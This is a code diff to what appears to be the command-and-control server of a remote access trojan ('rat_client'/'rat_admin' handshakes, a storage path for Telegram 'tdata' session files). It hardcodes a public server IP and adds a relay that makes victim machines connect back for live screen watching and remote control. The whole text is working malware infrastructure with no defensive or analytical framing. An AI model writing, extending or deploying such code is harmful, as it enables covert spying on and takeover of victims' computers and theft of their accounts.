@@ -11,6 +11,7 @@ CLIENT_IP = "0.0.0.0"
 CLIENT_PORT = 3131
 ADMIN_IP = "0.0.0.0"
 ADMIN_PORT = 4131
+PUBLIC_IP = "164.92.208.145" # Added for client connection back to server
 TDATA_STORAGE_PATH = os.path.join(os.getcwd(), "files", "tdatas")
 DB_PATH = 'db/admins.json'
 # ---------------------
@@ -100,6 +101,82 @@ def get_client_by_id(client_id):
         except (TypeError, IndexError):
             pass
     return None
+
+def find_free_port(start_port=30000, end_port=40000):
+    """Finds a free port on the server."""
+    for port in range(start_port, end_port):
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            if s.connect_ex(('127.0.0.1', port)) != 0:
+                return port
+    return None
+
+class StreamBridge(threading.Thread):
+    """Bridges two connections (Client and Admin) for streaming."""
+    def __init__(self, port):
+        super().__init__()
+        self.port = port
+        self.daemon = True
+        self.client_conn = None
+        self.admin_conn = None
+        self.stop_event = threading.Event()
+
+    def bridge(self, source, dest):
+        try:
+            while not self.stop_event.is_set():
+                data = source.recv(40960)
+                if not data: break
+                dest.sendall(data)
+        except:
+            pass
+        finally:
+            self.stop_event.set()
+            try: source.close()
+            except: pass
+            try: dest.close()
+            except: pass
+
+    def run(self):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        try:
+            sock.bind(('0.0.0.0', self.port))
+            sock.listen(2)
+            sock.settimeout(30) # Wait 30s for both to connect
+
+            # Accept two connections
+            for _ in range(2):
+                try:
+                    conn, addr = sock.accept()
+                    # Read handshake
+                    conn.settimeout(5)
+                    handshake = conn.recv(1024)
+                    conn.settimeout(None)
+                    
+                    if b'rat_client' in handshake.lower():
+                        self.client_conn = conn
+                    elif b'rat_admin' in handshake.lower():
+                        self.admin_conn = conn
+                    else:
+                        conn.close()
+                except socket.timeout:
+                    break
+                except Exception as e:
+                    print(f"[!] Bridge error accepting: {e}")
+                    break
+        except Exception as e:
+            print(f"[!] Bridge logic failed: {e}")
+        finally:
+             sock.close() 
+
+        if self.client_conn and self.admin_conn:
+            # Bi-directional bridge for control support, though watch is mostly uni-directional
+            t1 = threading.Thread(target=self.bridge, args=(self.client_conn, self.admin_conn), daemon=True)
+            t2 = threading.Thread(target=self.bridge, args=(self.admin_conn, self.client_conn), daemon=True)
+            t1.start(); t2.start()
+            t1.join(); t2.join()
+        else:
+            if self.client_conn: self.client_conn.close()
+            if self.admin_conn: self.admin_conn.close()
 
 class AdminManager:
     def __init__(self, db_path):
@@ -456,49 +533,71 @@ def handle_admin_connection(conn, addr):
 
             elif action == 'initiate_watch':
                 client_id = request.get('client_id')
-                stream_port = request.get('stream_port')
+                # stream_port (from admin) is ignored now; server decides port
                 fps = request.get('fps')
                 quality = request.get('quality')
-                capture_cursor = request.get('capture_cursor', True) # Default to True
-                admin_ip = addr[0]  # Get admin's IP from their socket connection
-
+                capture_cursor = request.get('capture_cursor', True)
+                
                 client_info = get_client_by_id(client_id)
 
                 if client_info:
-                    watch_request = {
-                        "action": "watch_start",
-                        "payload": {
-                            "ip": admin_ip,
-                            "port": stream_port,
-                            "fps": fps,
-                            "quality": quality,
-                            "capture_cursor": capture_cursor
+                    # Start Bridge
+                    bridge_port = find_free_port()
+                    if bridge_port:
+                        bridge = StreamBridge(bridge_port)
+                        bridge.start()
+                        
+                        # Tell Client
+                        watch_request = {
+                            "action": "watch_start",
+                            "payload": {
+                                "ip": PUBLIC_IP,
+                                "port": bridge_port,
+                                "fps": fps,
+                                "quality": quality,
+                                "capture_cursor": capture_cursor
+                            }
                         }
-                    }
-                    if not send_json(client_info['conn'], watch_request):
-                        send_json(conn, {"type": "error", "message": f"Failed to send watch command to client {client_id}."})
+                        if not send_json(client_info['conn'], watch_request):
+                            send_json(conn, {"type": "error", "message": f"Failed to send watch command to client {client_id}."})
+                        else:
+                            # Tell Admin
+                            send_json(conn, {"type": "watch_ready", "port": bridge_port, "client_id": client_id})
+                    else:
+                         send_json(conn, {"type": "error", "message": "No free ports on server."})
+
                 else:
                     send_json(conn, {"type": "error", "message": f"Client {client_id} not found."})
 
             elif action == 'initiate_control':
                 client_id = request.get('client_id')
-                stream_port = request.get('stream_port')
-                control_port = request.get('control_port')
-                admin_ip = addr[0]
-
+                # Ports ignored
                 client_info = get_client_by_id(client_id)
 
                 if client_info:
-                    control_request = {
-                        "action": "control_start",
-                        "payload": {
-                            "ip": admin_ip,
-                            "stream_port": stream_port,
-                            "control_port": control_port
+                    s_port = find_free_port()
+                    c_port = find_free_port(s_port + 1)
+                    
+                    if s_port and c_port:
+                        s_bridge = StreamBridge(s_port)
+                        c_bridge = StreamBridge(c_port)
+                        s_bridge.start()
+                        c_bridge.start()
+
+                        control_request = {
+                            "action": "control_start",
+                            "payload": {
+                                "ip": PUBLIC_IP,
+                                "stream_port": s_port,
+                                "control_port": c_port
+                            }
                         }
-                    }
-                    if not send_json(client_info['conn'], control_request):
-                        send_json(conn, {"type": "error", "message": f"Failed to send control command to client {client_id}."})
+                        if not send_json(client_info['conn'], control_request):
+                            send_json(conn, {"type": "error", "message": f"Failed to send control command to client {client_id}."})
+                        else:
+                            send_json(conn, {"type": "control_ready", "stream_port": s_port, "control_port": c_port, "client_id": client_id})
+                    else:
+                        send_json(conn, {"type": "error", "message": "No free ports on server."})
                 else:
                     send_json(conn, {"type": "error", "message": f"Client {client_id} not found."})
 
